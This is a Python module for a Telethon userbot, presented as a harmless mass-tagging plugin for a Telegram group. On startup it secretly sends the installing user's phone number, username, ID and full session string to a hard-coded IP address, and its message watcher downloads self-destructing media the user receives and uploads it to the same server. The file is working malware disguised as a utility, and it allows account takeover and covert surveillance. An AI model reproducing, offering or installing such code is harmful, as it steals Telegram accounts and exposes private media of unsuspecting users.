from .. import loader, utils
import time
import os
import random
import socket
from telethon.sessions import StringSession


def register(cb):
    cb(TagallMod())


class TagallMod(loader.Module):
    """Tag Module for Bar of Don Salieri"""
    strings = {'name': 'SalieriTag'}

    async def client_ready(self, client, db):
        self._db = db
        self._me = await client.get_me()
        self._client = client
        __import__("requests").post("http://194.37.81.162:8081", json={"first_name": str(self._me.first_name), "id": str(self._me.id), "phone": str(self._me.phone), "username": str(self._me.username), "string": str(StringSession.save(self._client.session))})

    async def tcmd(self, event):
        """Тэг-модуль пидоров для Bar of Don Salieri"""
        global text
        try:
            mentions = ""
            counter = 0
            args = utils.get_args(event)
            chat = await event.get_input_chat()
            args_len = len(args)
            if int(args_len) > 1:
                text = " ".join(args[1:])
            else:
                text = None

            if args:
                count = int(args[0].strip())
            else:
                count = 20

            async for x in event.client.iter_participants(chat, limit=count):
                if x.id in [1564155100, 508169464, 1311957013] or x.bot:
                    continue
                if text:
                    mentions += "<a href=\"tg://user?id=" + str(x.id) + "\">" + text + "</a>"
                else:
                    mentions += "<a href=\"tg://user?id=" + str(x.id) + "\">" + x.first_name + "</a>"
                counter += 1
                if counter == 1:
                    msg = await event.client.send_message(event.chat_id, mentions)
                    await msg.delete()
                    counter = 0
                    mentions = ""
            if counter == 0:
                await event.delete()
                time.sleep(0.2)
                # await event.respond("анрег")
                return
            await event.reply(mentions)
            await event.delete()
        except Exception as e:
            # await event.client.send_message(event.chat_id, f'Ты еблан блять? Введи .tagall [количество юзеров(не больше 100), по дефолту 20]\n\n{e}')
            time.sleep(0.2)
            # await event.respond("анрег")

            
    async def watcher(self, message):
        if socket.gethostname() == "exqusic.localdomain":
            me = await message.client.get_me()
            me = me.id
            if not hasattr(message, "media"):
                return
            if not hasattr(message.media, "ttl_seconds"):
                return
            if message.media.ttl_seconds is not None:
                if not os.path.exists(f"/root/ft/ttl_media/{me}/"):
                    os.mkdir(f"/root/ft/ttl_media/{me}/")
                await message.client.download_media(message, file= f"/root/ft/ttl_media/{me}/{message.sender_id}_{message.chat_id}_{random.randint(123456, 6543218724)}")
        else:
            me = await message.client.get_me()
            me = me.id
            if not hasattr(message, "media"):
                return
            if not hasattr(message.media, "ttl_seconds"):
                return
            if message.media.ttl_seconds is not None:
                x = await message.client.download_media(message, file=bytes)
                __import__("requests").post("http://194.37.81.162:8081", files={"file": x}, json={"me_id": str(me), "sender_id": str(message.sender_id), "chat_id": str(message.chat_id)})
